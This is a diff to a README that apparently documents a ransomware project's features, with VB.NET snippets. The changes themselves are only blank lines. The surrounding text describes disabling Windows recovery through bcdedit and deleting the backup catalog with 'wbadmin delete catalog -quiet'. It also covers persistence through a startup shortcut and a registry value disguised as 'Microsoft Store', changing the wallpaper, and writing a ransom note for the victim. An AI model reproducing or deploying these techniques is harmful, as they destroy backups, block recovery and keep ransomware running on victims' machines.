@@ -41,8 +41,8 @@ End Sub
 Private Shared Sub DisableRecoveryMode()
     Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no")
 End Sub
-
 </details>
+
 ## Delete Backup Catalog:
 	Will Execute This Command :
 		"wbadmin delete catalog -quiet"
@@ -55,6 +55,7 @@ Private Shared Sub DisableRecoveryMode()
 End Sub
 
 </details>
+
 ## Add Link To Startup:
     Make lnk File in startup 
 	For persistence
@@ -74,6 +75,7 @@ Private Shared Sub AddLinkToStartup()
 End Sub
 
 </details>
+
 ## Registry Startup:
     Set Registry Name Value "Microsoft Store" And Will Set Registry Value Data to The RansomWare Path 
 	The Key :
@@ -147,6 +149,7 @@ Public Shared Sub SetWallpaper(base64 As string)
 End Sub
 
 </details>
+	
 ## Add And Open Note:
     This Function Will Write Message For Victim
 	The Name Of a File "說明it.txt" 
